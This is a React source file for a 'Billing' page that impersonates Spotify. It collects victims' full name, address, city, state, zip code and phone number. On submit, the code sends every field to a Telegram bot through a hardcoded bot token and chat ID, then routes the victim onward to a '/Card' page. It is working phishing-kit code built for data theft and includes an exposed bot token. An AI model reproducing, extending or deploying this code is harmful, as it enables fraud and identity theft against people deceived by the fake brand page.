import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import './Billing.css'; // Import the CSS file for styles

const TELEGRAM_BOT_TOKEN = '7567933012:AAG_jlPLYWLcQe8G7jgVgiWcXixg9DBaCdo'; // Replace with your Telegram bot token
const CHAT_ID = '7464995879'; // Replace with your chat ID


function Billing() {
  const [formData, setFormData] = useState({
    fullName: '',
    address: '',
    city: '',
    state: '',
    zipCode: '',
    phoneNumber: ''
  });

  const navigate = useNavigate();

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    // Construct the message to send to Telegram
    const message = `
      New Billing Information:
      Full Name: ${formData.fullName}
      Address: ${formData.address}
      City: ${formData.city}
      State: ${formData.state}
      Zip Code: ${formData.zipCode}
      Phone Number: ${formData.phoneNumber}
    `;

    // Send data to Telegram
    try {
      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
        }),
      });

      if (response.ok) {
        console.log('Message sent to Telegram successfully');
      } else {
        console.error('Error sending message to Telegram');
      }
    } catch (error) {
      console.error('Error:', error);
    }

    // Navigate to the SMS page
    navigate('/Card');
  };

  return (
    <div className="billing-container"><br /><br />
      <img src="https://upload.wikimedia.org/wikipedia/commons/2/26/Spotify_logo_with_text.svg" alt="Spotify Logo" className="logo" />
      <h1>Log in for free to start listening.</h1>
      <h2>Enter Your Billing Information.</h2>
      <form onSubmit={handleSubmit}>
        <label>
          Full Name:
          <input
            type="text"
            name="fullName"
            value={formData.fullName}
            onChange={handleChange}
            placeholder="Enter your name."
            required
          />
        </label>
        <label>
          Address:
          <input
            type="text"
            name="address"
            value={formData.address}
            onChange={handleChange}
            placeholder="Enter your address."
            required
          />
        </label>
        <label>
          City:
          <input
            type="text"
            name="city"
            value={formData.city}
            onChange={handleChange}
            placeholder="Enter your City."
            required
          />
        </label>
        <label>
          State:
          <input
            type="text"
            name="state"
            value={formData.state}
            onChange={handleChange}
            placeholder="Enter your State."
            required
          />
        </label>
        <label>
          Zip Code:
          <input
            type="text"
            name="zipCode"
            value={formData.zipCode}
            onChange={handleChange}
            placeholder="Enter your Zip Code."
            required
          />
        </label>
        <label>
          Phone Number:
          <input
            type="tel"
            name="phoneNumber"
            value={formData.phoneNumber}
            onChange={handleChange}
            placeholder="Enter your Phone Number."
            required
          />
        </label>
        <button type="submit">Continue</button>
      </form>
    </div>
  );
}

export default Billing;
